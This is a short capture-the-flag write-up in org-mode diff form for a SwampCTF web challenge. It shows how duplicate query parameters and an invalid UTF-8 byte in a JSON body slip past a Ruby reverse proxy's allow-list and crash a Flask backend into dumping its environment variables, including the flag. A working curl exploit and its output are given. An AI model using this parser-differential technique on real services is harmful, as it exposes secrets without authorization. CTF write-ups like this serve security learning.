@@ -1,0 +1,51 @@
+* Description
+I have created a safe reverse proxy that only forwards requests to retrieve debug information
+from the backend. what could go wrong?
+
+http://chals.swampctf.com:41234
+
+* Solution
+
+key point:
+1. use ~/api?action=getFlag&action=getInfo~ to bypass frontend reverse proxy, which only allow ~action=getInfo~
+2. make the json body parse normal on the front but error on the backend parse:
+   - frontend parses the request body using [[https://ruby-doc.org/stdlib-3.0.2/libdoc/json/rdoc/JSON.html][JSON.parse]], which accepts the ~\xff~
+   - backend =Flask= attempts to decode the request body as UTF-8 before parse it as JSON. Since ~\xff~ is not valid
+     in UTF-8.
+
+#+begin_src shell
+ctf ❯ curl 'http://chals.swampctf.com:41234/api?action=getFlag&action=getInfo' -H 'Content-Type: application/json' -d '{"data":"\xff"}' -X POST
+{
+  "debug_data": {
+    "env_vars": {
+      "DATABASE_URL": "sqlite:///app.db",
+      "DEBUG": "True",
+      "ENV": "development",
+      "FLASK_ENV": "development",
+      "GPG_KEY": "E3FF2839C048B25C084DEBE9B26995E310250568",
+      "HOME": "/root",
+      "HOSTNAME": "1c5449781218",
+      "LANG": "C.UTF-8",
+      "LOG_LEVEL": "info",
+      "PATH": "/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+      "PYTHON_SHA256": "3126f59592c9b0d798584755f2bf7b081fa1ca35ce7a6fea980108d752a05bb1",
+      "PYTHON_VERSION": "3.9.21",
+      "SECRET_KEY": "swampCTF{1nt3r0p3r4b1l1ty_p4r4m_p0llut10n_x7q9z3882e}",
+      "WERKZEUG_RUN_MAIN": "true",
+      "WERKZEUG_SERVER_FD": "3"
+    },
+    "headers": {
+      "Accept": "*/*",
+      "Content-Length": "15",
+      "Content-Type": "application/json",
+      "Host": "backend:5000",
+      "User-Agent": "curl/8.13.0",
+      "Version": "HTTP/1.1",
+      "X-Forwarded-For": "61.224.78.93"
+    },
+    "method": "POST",
+    "url": "http://backend:5000/api?action=getFlag&action=getInfo"
+  },
+  "message": "Something broke!!"
+}
+#+end_src
